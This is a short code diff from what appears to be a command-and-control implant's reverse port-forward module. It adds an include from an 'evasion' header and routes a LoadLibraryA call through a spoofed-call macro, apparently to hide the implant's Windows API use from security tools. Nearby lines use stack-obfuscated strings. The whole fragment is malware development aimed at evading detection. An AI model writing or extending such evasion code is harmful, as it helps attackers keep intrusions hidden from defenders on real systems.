@@ -3,6 +3,7 @@
 #include <package.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_RPFWD
 
@@ -14,7 +15,7 @@ static auto declfn resolve_ws2_rpfwd(
     _Out_   RpfwdState* state
 ) -> bool {
     STK_WS2_32(_n);
-    state->h_ws2 = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    state->h_ws2 = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !state->h_ws2 ) return false;
 
     auto h = state->h_ws2;
